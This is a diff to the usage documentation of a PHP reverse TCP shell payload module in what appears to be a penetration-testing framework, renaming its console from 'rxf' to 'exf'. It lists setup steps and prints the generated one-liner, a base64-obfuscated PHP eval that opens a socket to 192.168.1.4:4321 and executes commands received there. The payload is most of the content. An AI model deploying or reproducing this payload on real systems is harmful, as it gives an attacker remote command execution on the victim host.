@@ -4,7 +4,7 @@ Module generates payload that creates interactive tcp reverse shell by using php
 
 ## Verification Steps
 
-  1. Start `./rxf.py`
+  1. Start `./exf.py`
   2. Do: `use payloads/cmd/php_reverse_tcp`
   3. Do: `set lhost 192.168.1.4`
   4. Do: `set lport 4321`
@@ -14,12 +14,12 @@ Module generates payload that creates interactive tcp reverse shell by using php
 ## Scenarios
 
 ```
-rxf > use payloads/cmd/php_reverse_tcp
-rxf (PHP Reverse TCP One-Liner) > set lhost 192.168.1.4
+exf > use payloads/cmd/php_reverse_tcp
+exf (PHP Reverse TCP One-Liner) > set lhost 192.168.1.4
 [+] lhost => 192.168.1.4
-rxf (PHP Reverse TCP One-Liner) > set lport 4321
+exf (PHP Reverse TCP One-Liner) > set lport 4321
 [+] lport => 4321
-rxf (PHP Reverse TCP One-Liner) > run
+exf (PHP Reverse TCP One-Liner) > run
 [*] Running module...
 [*] Generating payload
 php -r "eval(base64_decode('JHM9ZnNvY2tvcGVuKCJ0Y3A6Ly8xOTIuMTY4LjEuNCIsNDMyMSk7d2hpbGUoIWZlb2YoJHMpKXtleGVjKGZnZXRzKCRzKSwkbyk7JG89aW1wbG9kZSgiXG4iLCRvKTskby49IlxuIjtmcHV0cygkcywkbyk7fQ=='));"
